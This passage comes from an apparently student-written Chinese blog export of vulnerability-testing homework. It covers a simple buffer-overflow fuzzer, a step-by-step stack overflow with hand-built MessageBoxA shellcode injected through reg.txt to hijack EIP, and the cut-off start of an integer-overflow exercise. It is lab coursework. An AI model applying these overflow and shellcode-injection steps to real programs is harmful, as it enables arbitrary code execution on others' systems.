<h3 id="3-判断是否存在溢出"><a href="#3-判断是否存在溢出" class="headerlink" title="3. 判断是否存在溢出"></a>3. 判断是否存在溢出</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 为方便观察，在程序中加入标志性符号</span></span><br><span class="line"><span class="comment">//课本示例6-1</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">makeoverflow</span><span class="params">(<span class="keyword">char</span>* b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> des[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(des,b);</span><br><span class="line">	<span class="built_in">printf</span>(des);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&gt;<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,argc);</span><br><span class="line">		<span class="built_in">printf</span>(argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(argv[<span class="number">1</span>]);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(argv[<span class="number">2</span>]);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(argv[<span class="number">1</span>],<span class="string">"overflow"</span>)!=<span class="number">0</span>)<span class="comment">// strstr(str1,str2) 函数用于判断字符串str2是否是str1的子串。</span></span><br><span class="line">        	makeoverflow(argv[<span class="number">2</span>]);     </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        	<span class="built_in">printf</span>(<span class="string">"usage:findoverflow XXXX\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试程序：</p>
<ol>
<li><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%83/image-20200507002436762.png"  alt="image-20200507002436762"></p>
</li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业七/image-20200507001833966.png"  alt="image-20200507001833966" style="zoom:100%;">
</li>
<li><p>==存在溢出问题==</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%83/image-20200507003101236.png"  alt="image-20200507003101236"></p>
</li>
</ol>
<h2 id="2-尝试自己写一个Fuzzer程序，实现对此程序的漏洞挖掘，可以在输入构造的时候以overflow为基本输入"><a href="#2-尝试自己写一个Fuzzer程序，实现对此程序的漏洞挖掘，可以在输入构造的时候以overflow为基本输入" class="headerlink" title="(2)尝试自己写一个Fuzzer程序，实现对此程序的漏洞挖掘，可以在输入构造的时候以overflow为基本输入"></a>(2)尝试自己写一个Fuzzer程序，实现对此程序的漏洞挖掘，可以在输入构造的时候以<code>overflow</code>为基本输入</h2><h3 id="1-样例程序学习"><a href="#1-样例程序学习" class="headerlink" title="1. 样例程序学习"></a>1. 样例程序学习</h3><h4 id="1-memset和memcpy"><a href="#1-memset和memcpy" class="headerlink" title="1) memset和memcpy"></a>1) memset和memcpy</h4><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%83/image-20200507012838037.png"  alt="image-20200507012838037"></p>
<h4 id="2-样例Fuzzer程序"><a href="#2-样例Fuzzer程序" class="headerlink" title="2) 样例Fuzzer程序"></a>2) 样例Fuzzer程序</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> * testbuf=<span class="string">""</span>;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">	<span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">1024</span>);</span><br><span class="line">	<span class="keyword">if</span>(argc&gt;<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">20</span>;i&lt;<span class="number">50</span>;i+=<span class="number">2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			testbuf=<span class="keyword">new</span> <span class="keyword">char</span>[i];</span><br><span class="line">			<span class="built_in">memset</span>(testbuf,<span class="number">0</span>,i);</span><br><span class="line">			<span class="built_in">memset</span>(testbuf,<span class="string">'c'</span>,i);</span><br><span class="line">			<span class="built_in">memcpy</span>(buf,testbuf,i);</span><br><span class="line">			<span class="comment">// printf("%s\n",buf);</span></span><br><span class="line">			ShellExecute(<span class="literal">NULL</span>,<span class="string">"open"</span>,argv[<span class="number">1</span>],buf,<span class="literal">NULL</span>,SW_NORMAL);</span><br><span class="line">			<span class="keyword">delete</span> testbuf;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Fuzzing X 1\n其中X为被测试目标程序所在路径，1 表示开始循环递增暴力测试\n"</span>);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-Fuzzer程序需求分析"><a href="#2-Fuzzer程序需求分析" class="headerlink" title="2. Fuzzer程序需求分析"></a>2. Fuzzer程序需求分析</h3><ol>
<li>需要提供被测目标程序所在路径</li>
<li>argv[1]=”findoverflow “+待生成字符串</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> * testbuf=<span class="string">""</span>;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">	<span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">1024</span>);</span><br><span class="line">	<span class="keyword">char</span> a[]=<span class="string">"findoverflow "</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">20</span>;i&lt;<span class="number">50</span>;i+=<span class="number">2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			testbuf=<span class="keyword">new</span> <span class="keyword">char</span>[i];</span><br><span class="line">			<span class="built_in">memset</span>(testbuf,<span class="number">0</span>,i);</span><br><span class="line">			<span class="built_in">memset</span>(testbuf,<span class="string">'c'</span>,i);</span><br><span class="line">			<span class="built_in">memcpy</span>(buf,a,<span class="number">13</span>);</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=i+<span class="number">13</span>;j++)</span><br><span class="line">				buf[j+<span class="number">13</span>]=testbuf[j];</span><br><span class="line">			buf[i+<span class="number">13</span>]=<span class="number">0</span>;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);</span><br><span class="line">			<span class="keyword">delete</span> testbuf;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%83/image-20200507015547798.png"  alt="image-20200507015547798"></p>
<h3 id="3-Fuzzer程序"><a href="#3-Fuzzer程序" class="headerlink" title="3. Fuzzer程序"></a>3. Fuzzer程序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> * testbuf=<span class="string">""</span>;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">	<span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">1024</span>);</span><br><span class="line">	<span class="keyword">char</span> a[]=<span class="string">"findoverflow "</span>;</span><br><span class="line">	<span class="keyword">if</span>(argc&gt;<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">20</span>;i&lt;<span class="number">50</span>;i+=<span class="number">2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			testbuf=<span class="keyword">new</span> <span class="keyword">char</span>[i];</span><br><span class="line">			<span class="built_in">memset</span>(testbuf,<span class="number">0</span>,i);</span><br><span class="line">			<span class="built_in">memset</span>(testbuf,<span class="string">'c'</span>,i);</span><br><span class="line">			<span class="built_in">memcpy</span>(buf,a,<span class="number">13</span>);</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=i+<span class="number">13</span>;j++)</span><br><span class="line">				buf[j+<span class="number">13</span>]=testbuf[j];</span><br><span class="line">			buf[i+<span class="number">13</span>]=<span class="number">0</span>;</span><br><span class="line">			<span class="comment">//printf("%s\n",buf);</span></span><br><span class="line">			ShellExecute(<span class="literal">NULL</span>,<span class="string">"open"</span>,argv[<span class="number">1</span>],buf,<span class="literal">NULL</span>,SW_NORMAL);</span><br><span class="line">			<span class="keyword">delete</span> testbuf;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Fuzzing X 1\n其中X为被测试目标程序所在路径，1 表示开始循环递增暴力测试\n"</span>);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%83/image-20200507020421987.png"  alt="image-20200507020421987"></p>
]]></content>
      <categories>
        <category>漏洞测试作业</category>
      </categories>
      <tags>
        <tag>模糊测试</tag>
        <tag>漏洞测试</tag>
        <tag>Fuzzer</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞测试作业六：SHELLCODE编写实例</title>
    <url>/2020/05/15/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AD/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>Shellcode编写</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>请在XP VC6生成课本示例5-1的案例（DEBUG模式），通过修改reg.txt文件，址入shellcode。Shellcode的内容与课本一致。撰写实验报告。</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REGCODE <span class="meta-string">"12345678"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify</span><span class="params">(<span class="keyword">char</span>* code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> flag;</span><br><span class="line">	<span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">44</span>];</span><br><span class="line">	flag=<span class="built_in">strcmp</span>(REGCODE,code);	# 若str1=str2，则返回零</span><br><span class="line">	<span class="built_in">strcpy</span>(<span class="built_in">buffer</span>,code);</span><br><span class="line">	<span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> vFlag=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> regcode[<span class="number">1024</span>];</span><br><span class="line">	FILE * fp;</span><br><span class="line">	LoadLibrary(<span class="string">"user32.dll"</span>);</span><br><span class="line">	<span class="keyword">if</span>(!(fp=fopen(<span class="string">"reg.txt"</span>,<span class="string">"rw+"</span>)))</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">fscanf</span>(fp,<span class="string">"%s"</span>,regcode);</span><br><span class="line">	vFlag=verify(regcode);</span><br><span class="line">	<span class="keyword">if</span>(vFlag)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"wrong regcode!\n"</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"passed!\n"</span>);</span><br><span class="line">	fclose(fp);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="一、程序正常运行"><a href="#一、程序正常运行" class="headerlink" title="一、程序正常运行"></a>一、程序正常运行</h3><ol>
<li><code>regcode=&quot;12341234&quot;</code><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AD/image-20200417171458877.png"  alt="image-20200417171458877"></li>
<li><code>regcode=&quot;12345678&quot;</code><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AD/image-20200417171608189.png"  alt="image-20200417171608189"></li>
</ol>
<h3 id="二、弹出”passed-”"><a href="#二、弹出”passed-”" class="headerlink" title="二、弹出”passed!”"></a>二、弹出”passed!”</h3><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业六/image-20200417154118122.png"  alt="image-20200417154118122" style="zoom: 50%;">

<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>当<code>vFlag!=1</code>时程序跳转到<code>passed</code>,所以需要使<code>vFlag==0</code>。函数Verify的栈帧中，<code>buffer</code>对应44个字节，所以只需要利用<code>UltraEdit</code>在<code>reg.txt</code>中写入48位数据且后四位全部为<code>0</code>即可覆盖Flag，改变函数<code>verify</code>的返回值，从而改变<code>vFlag</code>的值。</p>
<h4 id="修改reg-txt"><a href="#修改reg-txt" class="headerlink" title="修改reg.txt"></a>修改reg.txt</h4><h5 id="1-flag-1"><a href="#1-flag-1" class="headerlink" title="1. flag==-1"></a>1. flag==-1</h5><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AD/image-20200417171845156.png"  alt="image-20200417171845156"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业六/image-20200417175300841.png"  alt="image-20200417175300841" style="zoom:65%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业六/image-20200417175357889.png"  alt="image-20200417175357889" style="zoom:65%;"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AD/image-20200417171458877.png"  alt="image-20200417171458877">失败</p>
<h5 id="2-flag-1"><a href="#2-flag-1" class="headerlink" title="2.flag==1"></a>2.flag==1</h5><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AD/image-20200417175956785.png"  alt="image-20200417175956785"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业六/image-20200417181151684.png"  alt="image-20200417181151684" style="zoom:65%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业六/image-20200417181235837.png"  alt="image-20200417181235837" style="zoom:65%;"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AD/image-20200417171608189.png"  alt="image-20200417171608189">成功</p>
<h4 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h4><p>读入字符串时默认遇到0就停下，末尾只能读入一个0，所以需要利用大端存储将<code>flag</code>的后三个字节全部置零，即使<code>flag=1</code>，即<code>REGCODE</code>大于<code>code</code>。</p>
<h3 id="三、弹出MessageBox"><a href="#三、弹出MessageBox" class="headerlink" title="三、弹出MessageBox"></a>三、弹出MessageBox</h3><h4 id="1-思路"><a href="#1-思路" class="headerlink" title="1.思路"></a>1.思路</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#### 2.MessageBox函数解析</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;C</span><br><span class="line">int MessageBox(</span><br><span class="line">	HWND	hWnd,		&#x2F;&#x2F;handle to owner window	消息框所属窗口的句柄，如果为NULL，消息框则不属于任何窗口</span><br><span class="line">	LPCTSTR	lpText,		&#x2F;&#x2F;text in message box	字符串指针，所指字符串会在消息框中显示</span><br><span class="line">	LPCTSTR	lpCaption,	&#x2F;&#x2F;message box title	字符串指针，所指字符串将成为消息框的标题</span><br><span class="line">	UNIT	uType		&#x2F;&#x2F;message box style	消息框的风格（单按钮、多按钮等），NULL代表默认风格</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="3-查看弹出MessageBox所对应的汇编代码"><a href="#3-查看弹出MessageBox所对应的汇编代码" class="headerlink" title="3. 查看弹出MessageBox所对应的汇编代码"></a>3. 查看弹出MessageBox所对应的汇编代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业六/image-20200417185248191.png"  alt="image-20200417185248191" style="zoom:80%;">

<p>==*注：不建议使用PUSH 0，因此采用xor ebx,ebx    push ebx代替==</p>
<h4 id="4-找到MessageBox函数入口地址"><a href="#4-找到MessageBox函数入口地址" class="headerlink" title="4. 找到MessageBox函数入口地址"></a>4. 找到MessageBox函数入口地址</h4><h5 id="a）调用函数，查看指令地址"><a href="#a）调用函数，查看指令地址" class="headerlink" title="a）调用函数，查看指令地址"></a>a）调用函数，查看指令地址</h5><p><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业六/image-20200417185720898.png"  alt="image-20200417185720898" style="zoom:80%;">地址：77D507EA</p>
<h5 id="b）利用Dependency工具查看地址"><a href="#b）利用Dependency工具查看地址" class="headerlink" title="b）利用Dependency工具查看地址"></a>b）利用Dependency工具查看地址</h5><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AD/image-20200417190015031.png"  alt="image-20200417190015031"></p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业六/image-20200417190123046.png"  alt="image-20200417190123046" style="zoom:67%;">

<p>随便拖入一个PE文件，就可以看到它所使用的库文件了，在左侧列中选出USER32.DLL，MessageBox显示字符类型为A类（ASCII），因此在汇编语言中调用的应该是MessageBoxA</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业六/image-20200417190700431.png"  alt="image-20200417190700431" style="zoom:75%;">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">所以函数地址为&#96;&#96;&#96;0x77D10000+0x000407EA&#x3D;0x77D504EA</span><br></pre></td></tr></table></figure>

<h5 id="c）编写指令代码"><a href="#c）编写指令代码" class="headerlink" title="c）编写指令代码"></a>c）编写指令代码</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	LoadLibrary(&quot;user32.dll&quot;);</span><br><span class="line">	_asm</span><br><span class="line">	&#123;</span><br><span class="line">		xor	ebx,ebx&#x2F;&#x2F;使用寄存器代替0</span><br><span class="line">		push	ebx</span><br><span class="line">		push	ebx</span><br><span class="line">		push	ebx</span><br><span class="line">		push	ebx</span><br><span class="line">		mov	eax,77d507eah&#x2F;&#x2F;函数入口地址77d507ea</span><br><span class="line">		call eax</span><br><span class="line">	&#125;</span><br><span class="line">	return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>嵌入字符串“westwest”，对应16进制<code>w:77</code>,<code>e:65</code>,<code>s:73</code>,<code>t:74</code>,大端存储改为<code>push 74736577</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	LoadLibrary(&quot;user32.dll&quot;);</span><br><span class="line">	_asm</span><br><span class="line">	&#123;</span><br><span class="line">		xor		ebx,ebx</span><br><span class="line">		push	ebx&#x2F;&#x2F;使用寄存器代替0</span><br><span class="line">		push	74736577h&#x2F;&#x2F;注意标明16进制</span><br><span class="line">		push	74736577h</span><br><span class="line">		mov		eax,esp&#x2F;&#x2F;栈顶即指向字符串的指针</span><br><span class="line">		push	ebx</span><br><span class="line">		push	eax</span><br><span class="line">		push	eax</span><br><span class="line">		push	ebx</span><br><span class="line">		mov		eax,77d507eah&#x2F;&#x2F;函数入口地址77d507ea</span><br><span class="line">		call	eax</span><br><span class="line">	&#125;</span><br><span class="line">	return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业六/image-20200417224545360.png"  alt="image-20200417224545360" style="zoom:80%;">

<p>弹出窗口，测试成功</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业六/image-20200417224926327.png"  alt="image-20200417224926327" style="zoom: 50%;">

<p>得到机器代码<code>33 DB 53 68 77 65 73 74 68 77 65 73 74 8B C4 53 50 50 53 B8 EA 07 D5 77 FF D0</code></p>
<h5 id="d）编写Shellcode代码"><a href="#d）编写Shellcode代码" class="headerlink" title="d）编写Shellcode代码"></a>d）编写Shellcode代码</h5><p>用记事本将空格替换为’\x’</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">char ourshellcode[]&#x3D;&quot;\x33\xDB\x53\x68\x77\x65\x73\x74\x68\x77\x65\x73\x74\x8B\xC4\x53\x50\x50\x53\xB8\xEA\x07\xD5\x77\xFF\xD0&quot;;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	LoadLibrary(&quot;user32.dll&quot;);</span><br><span class="line">	int * ret;</span><br><span class="line">	ret&#x3D;(int*)&amp;ret+2;</span><br><span class="line">	(*ret)&#x3D;(int)ourshellcode;</span><br><span class="line">	return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业六/image-20200417193835870.png"  alt="image-20200417193835870" style="zoom:10%;">将EIP内容替换为shellcode内容，执行shellcode代码</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业六/image-20200417225143954.png"  alt="image-20200417225143954" style="zoom: 50%;">测试成功</p>
<h5 id="将shellcode写入reg-txt"><a href="#将shellcode写入reg-txt" class="headerlink" title="将shellcode写入reg.txt"></a>将shellcode写入reg.txt</h5><p><code>buffer</code>地址<img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AD/image-20200417232517054.png"  alt="image-20200417232517054"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AD/image-20200418000448906.png"  alt="image-20200418000448906"></p>
<p>弹出对话框，实验成功</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业六/image-20200418000555901.png"  alt="image-20200418000555901" style="zoom:67%;">]]></content>
      <categories>
        <category>漏洞测试作业</category>
      </categories>
      <tags>
        <tag>漏洞测试</tag>
        <tag>Shellcode编写</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞测试作业五：整数溢出漏洞</title>
    <url>/2020/05/15/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%BA%94/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>整数溢出漏洞</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>请在XP VC6生成课本示例4-2的案例（DEBUG模式）。进而，修改input.txt文件，使得程序运行时弹出计算器。<br>提示：input.txt在利用IDE调试时需要放到cpp文件相对目录下；单独运行exe的时候，需要放到exe所在目录中</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="课本示例"><a href="#课本示例" class="headerlink" title="课本示例"></a>课本示例</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;shellapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_INFO 32767</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ShellExecute(<span 